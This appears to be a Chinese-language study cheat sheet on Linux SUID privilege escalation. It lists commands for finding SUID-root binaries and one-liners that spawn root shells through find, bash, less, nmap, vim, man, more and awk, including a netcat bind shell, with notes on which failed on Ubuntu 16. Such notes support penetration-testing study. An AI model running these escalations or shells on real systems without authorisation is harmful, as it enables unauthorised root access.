# 提权查看
https://gtfobins.github.io/ 
# NFS提权
# suid提权
首先查看带有suid权限的文件

    find / -perm -u=s -type f>a.txt
    find / -perm -u=s -type f>a.txt
    find / -user root -perm -4000 -print 2>/dev/null
    find / -user root -perm -4000 -exec ls -ldb {} ;
查看有suid提权漏洞的文件，目前已知的可用来提权的linux可行性文件列表如下

    Nmap
    Vim
    find
    Bash
    More
    Less
    Nano
    cp

# 设置环境
    find / -name find | xargs ls -F
`查找后缀有*的可执行文件`

    chmod u+s /usr/bin/find
    ls -al /usr/bin/find
# find
    chmod +s /usr/bin/find
    find pentestlab -exec whoami \;
    find pentestlab -exec netcat -lvp 5555 -e /bin/sh \;
    find / -type f -name getflag -exec "whoami" \;
    find / -type f -name getflag -exec "/bin/sh" \;
    find . -exec '/bin/sh' \;
# bash
    chmod +s /bin/bash
    bash -p
# less
    chmod +s /bin/less
    less /etc/passwd
    !/bin/sh
# nmap
## 老版本
    chmod +s /usr/bin/nmap
    nmap --interactive
# vim
## 1

    chmod +s /usr/bin/vim.basic
    vim /etc/passwd(改成跟root一样)
## 2(ubuntu16未成功)

    vim.tiny
    :set shell=/bin/sh
    :shell

# man(ubuntu16未成功)

    man passwd
    !/bin/bash
# more(ubuntu16未成功)

    more /etc/passwd
    !/bin/bash

# awk(ubuntu16未成功)

    awk 'BEGIN {system("/bin/bash")}'